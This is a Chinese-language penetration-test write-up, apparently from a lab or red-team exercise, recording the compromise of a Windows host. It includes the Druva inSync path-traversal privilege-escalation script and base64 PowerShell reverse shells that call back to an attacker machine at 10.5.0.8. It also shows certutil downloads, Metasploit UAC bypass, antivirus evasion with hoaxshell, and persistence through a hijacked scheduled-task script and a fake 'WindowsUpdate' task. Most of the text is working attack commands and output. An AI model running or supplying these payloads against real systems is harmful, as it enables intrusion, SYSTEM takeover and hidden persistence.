Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================

...

inSyncAgent.exe               3724 RDP-Tcp#0                  2     44,204 K Running         DIGISERVER3\user1                                       0:01:27 Druva inSync
...
```

用SearchSploit找`Druva`
```bash
┌──(root㉿kali)-[~]
└─# searchsploit druva
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Druva inSync Windows Client 6.5.2 - Local Privilege Escalation                              | windows/local/48400.txt
Druva inSync Windows Client 6.6.3 - Local Privilege Escalation                              | windows/local/48505.txt
Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)                 | windows/local/49211.ps1
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Clone Exploit
```bash
┌──(root㉿kali)-[~]
└─# searchsploit -m 49211.ps1
  Exploit: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
      URL: https://www.exploit-db.com/exploits/49211
     Path: /usr/share/exploitdb/exploits/windows/local/49211.ps1
File Type: ASCII text
```

Druva服務以SYSTEM權限執行，
把連接端口開在本地的6064，
只要請求的執行檔位置在`C:\ProgramData\Druva\inSync4\`目錄之下，
就能被允許以SYSTEM身分執行，
用**Path Traversal**可繞過檢查。

編輯druva提權POC腳本:
**`vi 49211.ps1`**
```powershell!
$ErrorActionPreference = "Stop"

$cmd = "C:\Users\user1\AppData\Local\Temp\2\update.vbs"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command) 
```

在攻擊方裝置用python3架http server，方便在目標裝置下載檔案
```bash
cd tmp && screen python3 http.server 80
```
建立`update.vbs`
```bash!
cat > tmp/update.vbs << EOF
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANQAuADAALgA4ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="), 0, true
EOF
```

確認檔案
```bash
┌──(root㉿kali)-[~]
└─# ls tmp | grep -E "druva|update"
druva.ps1
update.vbs
```

允許PowerShell執行腳本
```cmd!
C:\windows\system32>powershell Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
```

利用windows內建的`certutil.exe`，
下載`update.vbs`彈reverse shell，`druva.ps1`將shell提權到SYSTEM
```cmd
C:\windows\system32>cd %temp%
cd %temp%

C:\Users\user1\AppData\Local\Temp\2>certutil.exe -urlcache -split -f http://10.5.0.8/druva.ps1 druva.ps1
certutil.exe -urlcache -split -f http://10.5.0.8/druva.ps1 druva.ps1
****  Online  ****
  0000  ...
  02a8
CertUtil: -URLCache command completed successfully.

C:\Users\user1\AppData\Local\Temp\2>certutil.exe -urlcache -split -f http://10.5.0.8/update.vbs update.vbs
certutil.exe -urlcache -split -f http://10.5.0.8/update.vbs update.vbs
****  Online  ****
  0000  ...
  0585
CertUtil: -URLCache command completed successfully.

C:\Users\user1\AppData\Local\Temp\2>powershell .\druva.ps1
powershell .\druva.ps1
22
4
4
156
```

**Listener:**
成功拿到SYSTEM的Shell
```bash!
┌──(root㉿kali)-[~]
└─# rlwrap -cAr nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.5.0.13 53375
whoami
nt authority\system
PS C:\windows\system32>
```

#### Persistence
[同下](#自行建立排程)


### Metasploit
#### Exploit
用`windows/http/easyfilesharing_post`可成功exploit，
因為是直接注入easy file sharing的主程式`fsws.exe`，
所以防毒沒有偵測。
```bash
meterpreter > getpid
Current pid: 5876
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                              Path
 ---   ----  ----                  ----  -------  ----                              ----
 5804  3812  Oobe.exe              x64   3        DIGISERVER3\user1                 C:\Windows\System32\Oobe.exe
 ...
 5876  3416  fsws.exe              x86   2        DIGISERVER3\digiserver3           C:\EFS Software\Easy File Sharing Web Se
                                                                                    rver\fsws.exe
 5992  528   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM               C:\Windows\servicing\TrustedInstaller.ex
```

#### Privilege Escalation
用`exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc`會被防毒偵測
改用exploit suggester建議的event viewer bypass uac
```cmd!
msf6 exploit(windows/local/bypassuac_eventvwr) > exploit

[*] Started reverse TCP handler on 10.5.0.8:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175686 bytes) to 10.5.0.13
[*] Cleaning up registry keys ...
[*] Meterpreter session 53 opened (10.5.0.8:4444 -> 10.5.0.13:50497) at 2022-09-06 06:17:43 +0000

meterpreter > getuid
Server username: DIGISERVER3\user1
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

#### Persistence
##### 利用已建立之排程
建立一個meterpreter backdoor到檔案，掃毒還是會擋，
所以利用目標已自行建立的schedule tasks:`delAdminFiles`，
加入reverse shell腳本。

```bash
C:\Users\digiserver3\Desktop>schtasks
schtasks

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
delAdminFiles                            N/A                    Running
MicrosoftEdgeUpdateTaskMachineCore       9/5/2022 9:20:54 AM    Ready
MicrosoftEdgeUpdateTaskMachineUA         9/5/2022 4:50:54 AM    Ready
```
發現`delAdminFiles`可利用
```batch
C:\Users\digiserver3\Desktop>schtasks /query /fo LIST /v /tn delAdminFiles
schtasks /query /fo LIST /v /tn delAdminFiles

Folder: \
HostName:                             DIGISERVER3
TaskName:                             \delAdminFiles
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        9/5/2022 5:17:30 AM
Last Result:                          -2147216609
Author:                               DIGISERVER3\digiserver3
Task To Run:                          C:\AdminScripts\schedule-login-clean-old-file.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          DIGISERVER3\digiserver3
Delete Task If Not Rescheduled:       Enabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```
得知batch檔置: `C:\AdminScripts\schedule-login-clean-old-file.bat`

用meterpreter內建的`edit`指令進入vim編輯
```bash
meterpreter > edit schedule-login-clean-old-file.bat
```
![](https://i.imgur.com/w2vUQ0G.png)

##### 自行建立排程
建立排程，開機自動執行"WindowsUpdate"
**`C:\windows\system32\WindowsUpdate.vbs`**
```vbscript!
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell -e YQBkAGQALQB0AHkAcABlACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBOAGUAdAA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBzADsACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFQAcgB1AHMAdABBAGwAbABDAGUAcgB0AHMAUABvAGwAaQBjAHkAIAA6ACAASQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkAIAB7AHAAdQBiAGwAaQBjACAAYgBvAG8AbAAgAEMAaABlAGMAawBWAGEAbABpAGQAYQB0AGkAbwBuAFIAZQBzAHUAbAB0ACgACgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdAAgAHMAcgB2AFAAbwBpAG4AdAAsACAAWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUALABXAGUAYgBSAGUAcQB1AGUAcwB0ACAAcgBlAHEAdQBlAHMAdAAsACAAaQBuAHQAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUAUAByAG8AYgBsAGUAbQApACAAewByAGUAdAB1AHIAbgAgAHQAcgB1AGUAOwB9AH0ACgAiAEAACgBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVAByAHUAcwB0AEEAbABsAEMAZQByAHQAcwBQAG8AbABpAGMAeQAKACQAcwA9ACcAMQAwAC4ANQAuADAALgA4ADoANAA0ADMAJwA7ACQAaQA9ACcAMgBhADIANwAzADAANAA1AC0AMAA3AGEANgA4AGIAYwBiAC0AMAAyAGIAZQA2ADcAMQAwACcAOwAkAHAAPQAnAGgAdAB0AHAAcwA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMgBhADIANwAzADAANAA1ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADQAZAA2ADQALQAxADcAYgA3ACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADAANwBhADYAOABiAGMAYgAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQA0AGQANgA0AC0AMQA3AGIANwAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwAwADIAYgBlADYANwAxADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQA0AGQANgA0AC0AMQA3AGIANwAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A"), 0, true
```

```bash
C:\windows\system32> certutil.exe -urlcache -split -f http://10.5.0.8/WindowsUpdate.vbs WindowsUpdate.vbs
****  Online  ****
  0000  ...
  0985
CertUtil: -URLCache command completed successfully.

C:\windows\system32>schtasks /create /tn WindowsUpdate /tr "C:\windows\system32\WindowsUpdate.vbs" /sc onstart /ru System
schtasks /create /tn WindowsUpdate /tr "C:\windows\system32\WindowsUpdate.vbs" /sc onstart /ru System
SUCCESS: The scheduled task "WindowsUpdate" has successfully been created.

C:\windows\system32>
```

### Encrypted Reverse Shell
用[hoaxshell](https://github.com/t3l3machus/hoaxshell)規避Microsoft Defender檢查，
透過powershell，開啟Encrypted shell session (https)
此為stager，待meterpreter backdoor也成功繞過檢查後，再升級
 
**Listener:**
 ```bash
 ┌──(root💀digistudent1)-[~/hoaxshell]
└─# python3 hoaxshell.py -s 10.5.0.8 -c cert.pem -k key.pem

    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬
    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │
    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘
                           by t3l3machus

Enter PEM pass phrase:
[Info] Generating reverse shell payload...
powershell -e YQBkAGQALQB0AHkAcABlACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBOAGUAdAA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBzADsACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFQAcgB1AHMAdABBAGwAbABDAGUAcgB0AHMAUABvAGwAaQBjAHkAIAA6ACAASQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkAIAB7AHAAdQBiAGwAaQBjACAAYgBvAG8AbAAgAEMAaABlAGMAawBWAGEAbABpAGQAYQB0AGkAbwBuAFIAZQBzAHUAbAB0ACgACgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdAAgAHMAcgB2AFAAbwBpAG4AdAAsACAAWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUALABXAGUAYgBSAGUAcQB1AGUAcwB0ACAAcgBlAHEAdQBlAHMAdAAsACAAaQBuAHQAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUAUAByAG8AYgBsAGUAbQApACAAewByAGUAdAB1AHIAbgAgAHQAcgB1AGUAOwB9AH0ACgAiAEAACgBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVAByAHUAcwB0AEEAbABsAEMAZQByAHQAcwBQAG8AbABpAGMAeQAKACQAcwA9ACcAMQAwAC4ANQAuADAALgA4ADoANAA0ADMAJwA7ACQAaQA9ACcANgBiAGYANAAwADgAYwAzAC0ANAA2AGUAYgBhAGEANQAzAC0ANABlADUANAA4ADMAOQAxACcAOwAkAHAAPQAnAGgAdAB0AHAAcwA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgBiAGYANAAwADgAYwAzACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEAMwBhADIALQAyADAAMgA0ACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADQANgBlAGIAYQBhADUAMwAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBhADMAYQAyAC0AMgAwADIANAAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA0AGUANQA0ADgAMwA5ADEAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBhADMAYQAyAC0AMgAwADIANAAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
[Info] Type "help" to get a list of the available prompt commands.
[Info] Https Server started on port 443.
[Important] Awaiting payload execution to initiate shell session...
[Shell] Payload execution verified!
[Shell] Stabilizing command prompt...

PS C:\Users\digiserver3\Desktop > msg * XD
 ```
 
下`-g`restore
```bash
python3 hoaxshell.py -s 10.5.0.8 -c cert.pem -k key.pem -g
```


**Refer**
- https://github.com/0xsp-SRD/mortar
- 